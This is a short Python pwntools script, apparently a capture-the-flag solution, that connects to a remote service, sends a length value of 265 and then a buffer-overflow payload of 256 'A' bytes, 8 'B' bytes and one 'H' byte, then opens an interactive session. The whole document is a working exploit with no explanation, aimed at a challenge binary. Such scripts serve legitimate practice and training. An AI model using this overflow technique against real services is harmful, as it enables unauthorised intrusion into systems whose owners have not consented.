from pwn import *

#p = process("./prob")
p = remote(ADDRESS, PORT)
p.sendlineafter(": ", b"265")
payload = b"A" * 256 + b"B" * 8 + b"H"
p.sendline(payload)
p.interactive()